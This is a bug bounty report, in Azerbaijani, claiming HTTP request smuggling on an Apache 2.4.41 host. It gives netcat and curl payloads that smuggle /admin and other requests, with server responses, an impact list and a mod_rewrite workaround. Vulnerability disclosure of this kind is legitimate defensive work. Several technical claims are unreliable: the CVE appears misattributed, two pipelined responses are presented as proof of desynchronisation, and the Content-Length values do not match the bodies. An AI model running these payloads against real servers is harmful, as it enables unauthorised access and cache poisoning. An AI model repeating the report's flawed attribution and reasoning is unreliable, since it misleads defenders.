Bug Bounty Hesabatı: CVE-2020-11993
Başlıq: Apache/2.4.41 üzərində Ziddiyyətli Başlıqlar Səbəbindən HTTP Request Smuggling (CVE-2020-11993)

Zəifliyin Növü: HTTP Request Smuggling (CWE-444: Inconsistent Interpretation of HTTP Requests)
Hədəf:
IP Ünvan: [REDACTED_IP]
Port: 80 (HTTP)
Server Texnologiyası: Apache/2.4.41 (Ubuntu)
Təsirin Ciddiliyi: Yüksək (High) - CVSS 3.1 Score: 7.5

Təsvir (Description)
Hədəf sistemdə çalışan Apache HTTP Server (versiya 2.4.41) CVE-2020-11993 kodlu zəifliyə qarşı həssasdır. Zəiflik, serverin eyni sorğu daxilində həm Transfer-Encoding: chunked, həm də Content-Length başlıqlarını ehtiva edən HTTP sorğularını düzgün idarə edə bilməməsindən qaynaqlanır.

Bu ziddiyyətli vəziyyət, front-end (məsələn, reverse proxy və ya load balancer) və back-end (Apache server) arasında sorğunun sərhədlərinin fərqli şərh edilməsinə səbəb olur. Nəticədə, hücumçu birinci sorğunun gövdəsinə ikinci, zərərli bir HTTP sorğusunu "gizlədərək" (smuggling) back-end serverə birbaşa göndərə bilir. Bu, arxa plandakı tətbiqlərin məntiqini pozmaq və təhlükəsizlik mexanizmlərindən yan keçmək üçün şərait yaradır.

Təkrarlama Addımları (Steps to Reproduce / PoC)
Zəifliyi təsdiqləmək üçün iki fərqli metoddan istifadə edilmişdir.

PoC 1: Desinxronizasiyanın Təsdiqi (nc ilə)
Bu testin məqsədi bir TCP bağlantısı üzərindən iki fərqli HTTP cavabı alaraq serverlər arasındakı desinxronizasiyanı sübut etməkdir.

Aşağıdakı netcat (nc) əmrini terminalda icra edin:

Bash

printf 'POST / HTTP/1.1\r\nHost: [REDACTED_IP]\r\nContent-Length: 53\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: [REDACTED_IP]\r\n\r\n' | nc [REDACTED_IP] 80
Gözlənilən Nəticə:
Serverdən aşağıdakı kimi ardıcıl iki cavab alınacaq:

HTTP

HTTP/1.1 200 OK
Date: Fri, 20 Jun 2025 16:15:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 48
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html><html><script>window.location.href="index.php";</script></html>
HTTP/1.1 404 Not Found
Date: Fri, 20 Jun 2025 16:15:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 277
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
...
Təhlil: Göründüyü kimi, bir TCP bağlantısı daxilində serverdən iki fərqli HTTP cavabı (biri 200 OK, digəri 404 Not Found) alınır. Bu, front-end və back-end serverlər arasında desinxronizasiyanın və HTTP Request Smuggling zəifliyinin qəti sübutudur.

PoC 2: Potensial Keş Zəhərlənməsi Testi (curl ilə)
Aşağıdakı curl əmrini icra edin:

Bash

curl -v -X POST http://[REDACTED_IP] \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nGET /nonexistentpage HTTP/1.1\r\nHost: [REDACTED_IP]\r\n\r\n'
Təhlil: Bu sorğuda əsas səhifə üçün 200 OK cavabı alınır, lakin daxildə gizlədilmiş (smuggled) /nonexistentpage sorğusu arxa plandakı serverə ötürülür. Əgər sistemdə bir keş (cache) mexanizmi varsa, hücumçu bu yolla əsas səhifənin keşini zəhərləyərək onu /nonexistentpage səhifəsinin məzmunu ilə əvəz edə bilər.

Təsir və Risklər (Impact and Risks)
Bu zəifliyin istismarı ciddi təhlükəsizlik riskləri yaradır:

Veb Keşinin Zəhərlənməsi (Web Cache Poisoning): Hücumçu veb keşini manipulyasiya edərək istifadəçilərə zərərli və ya saxta məzmun təqdim edə bilər.
Sessiya Fiksasiyası və Oğurlanması (Session Fixation and Hijacking): Hücumçu istifadəçilərin sessiyalarını ələ keçirərək onların hesablarına tam nəzarət edə bilər.
Autentifikasiyadan Yan Keçmə (Authentication Bypass): Qorunan səhifələrə (/admin kimi) icazəsiz giriş əldə etmək mümkün ola bilər.
Daxili Sistemlərə Çıxış (Access to Internal Systems): Təhlükəsizlik yoxlamalarından yan keçərək yalnız daxili şəbəkədən əlçatan olan API və servislərə sorğu göndərmək mümkündür.
Həll Yolu (Remediation)
Zəifliyi dərhal aradan qaldırmaq üçün aşağıdakı addımlar tövsiyə olunur:

Serverin Yenilənməsi (Təcili): Apache HTTP Server-i ən azı 2.4.42 və ya daha yeni bir versiyaya yeniləyin. Bu versiyada CVE-2020-11993 zəifliyi aradan qaldırılıb.
Müvəqqəti Həll (Yeniləmə Mümkün Deyilsə): Apache konfiqurasiyasında mod_rewrite modulundan istifadə edərək həm Content-Length, həm də Transfer-Encoding başlığına sahib olan bütün sorğuları rədd edin. Konfiqurasiya faylına (httpd.conf və ya .htaccess) aşağıdakı qaydaları əlavə edin:
Apache

RewriteEngine on
RewriteCond %{HTTP:Transfer-Encoding} chunked
RewriteCond %{HTTP:Content-Length} .
RewriteRule .* - [F]
Qatmanlı Müdafiə: Sistemdəki Reverse Proxy, Load Balancer və ya Web Application Firewall (WAF) kimi cihazların da bu cür ziddiyyətli sorğuları bloklayacaq şəkildə konfiqurasiya edildiyindən əmin olun.





